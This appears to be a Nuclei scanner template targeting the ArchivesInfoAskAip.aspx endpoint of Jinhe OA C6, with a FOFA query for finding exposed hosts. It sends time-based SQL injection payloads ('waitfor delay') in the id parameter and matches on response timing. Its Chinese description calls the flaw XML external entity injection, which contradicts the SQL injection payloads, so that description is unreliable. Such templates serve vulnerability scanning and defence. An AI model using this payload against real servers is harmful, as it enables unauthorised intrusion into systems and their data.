id: jinhe-oa-archivesinfoaskaip-sqli
info:
  name: 金和OA ArchivesInfoAskAip.aspx接口XXE漏洞
  author: 0dayPoc
  severity: high
  description: |-
    fofa: app="金和网络-金和OA"
        金和网络作为专业信息化服务商，其金和OA系统C6版本的ArchivesInfoAskAip.aspx接口存在XML外部实体注入漏洞。攻击者可利用该漏洞读取服务器敏感文件内容，实施内网服务探测，最终可能导致系统控制权丧失。
  tags: 金和OA
http:
- raw:
  - |
    GET /c6/Jhsoft.Web.Archives/ArchivesInfoAskAip.aspx/?id=1'+waitfor+delay'0:0:5'-- HTTP/1.1
    Host: {{Hostname}}
  - |
    GET /c6/Jhsoft.Web.Archives/ArchivesInfoAskAip.aspx/?id=1'+waitfor+delay'0:0:8'-- HTTP/1.1
    Host: {{Hostname}}
  matchers:
  - type: dsl
    dsl:
    - duration_1>=5 && duration_1<=6
    - duration_2>=8 && duration_2<=9
    condition: and
